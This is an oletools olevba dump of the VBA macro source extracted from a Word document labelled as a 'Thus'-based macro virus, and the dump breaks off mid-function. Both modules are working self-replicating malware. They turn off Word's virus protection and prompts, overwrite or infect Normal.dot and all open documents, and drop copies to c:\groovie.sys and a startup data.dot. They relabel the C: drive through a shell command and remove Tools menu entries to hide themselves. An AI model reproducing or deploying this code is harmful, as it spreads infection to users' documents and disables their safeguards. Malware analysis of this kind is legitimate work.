olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-a13fe40e85d91e640ba32543126418c6be0560ad
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-a13fe40e85d91e640ba32543126418c6be0560ad - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub












































































































































































-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Thus-based-a13fe40e85d91e640ba32543126418c6be0560ad - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Public I02 As Boolean
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Public I03 As Boolean
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Public I04 As Boolean
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Public I05 As Boolean
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Public I06 As String
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Public I07 As Boolean
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Public I08 As Boolean
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I09()
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If MacroContainer = NormalTemplate Then
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        I01 = "normal"
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        GoTo checkout
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    End If
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
checkout:
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I10()
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    Next I
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    Next I
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I11()
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I09
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I10
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I01 = "document" Then Call I12
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I01 = "normal" Then Call I13
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I01 = "orbit" Then Call I14
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I12()
 ' N5/12/2003 2:31:20 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I03 = False And I05 = False Then
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        With NormalTemplate.VBProject
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        With .VBComponents.Import("c:\groovie.sys")
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    End If
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I02 = False Then
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        If I08 = False Then Documents.Open FileName:=I06
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        Shell ("label c: groovie"), 0
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        Windows(1).Close
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    End If
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I13()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Application.ScreenUpdating = False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    Call I17
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I04 = False And I07 = True Then
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        With ActiveDocument.VBProject
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        With .VBComponents.Import("c:\groovie.sys")
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        With Dialogs(wdDialogFileSummaryInfo)
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            .Comments = "ALT-F11 says it's groovie!"
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            .Execute
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    End If
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I02 = False And I07 = True Then
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        If I08 = False Then Documents.Open FileName:=I06
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    End If
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If I02 = False And I07 = False Then
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        Documents.Add Template:="", NewTemplate:=False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    End If
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Application.ScreenUpdating = True
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I14()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Application.ScreenUpdating = False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        If I03 = False And I05 = False Then
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            With NormalTemplate.VBProject
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            With .VBComponents.Import("c:\groovie.sys")
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            NormalTemplate.Save
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        End If
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        If I04 = False Then
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            With ActiveDocument.VBProject
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            With .VBComponents.Import("c:\groovie.sys")
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            With Dialogs(wdDialogFileSummaryInfo)
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
                .Comments = "ALT-F11 says it's groovie!"
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
                .Execute
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
            End With
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        End If
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Application.ScreenUpdating = True
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I15()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    Options.VirusProtection = False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    Options.SaveNormalPrompt = False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    Options.ConfirmConversions = False
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    I06 = ActiveDocument.FullName
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    Call I11
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Function
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub AutoOpen()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I15
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub AutoClose()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
I08 = True
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I15
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub AutoExit()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I15
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub FileSaveAs()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I16
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I15
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Dialogs(wdDialogFileSaveAs).Show
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub filesave()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I16
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I15
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub fileclose()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
I08 = True
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I15
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
ActiveDocument.Close
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub fileprint()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error Resume Next
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Call I15
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Dialogs(wdDialogFilePrint).Show
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub viewvbcode()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub ToolsMacro()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Sub FileTemplates()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
End Sub
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
Function I17()
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
On Error GoTo docek
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
    If ActiveDocument.Name <> "" Then
 ' N5/12/2003 2:31:21 PM112nelro112\\ELECNET\KBP_S_HPL5_08.SAP_Printing.KBG.WC.GENER on NE01:
        I07 = True
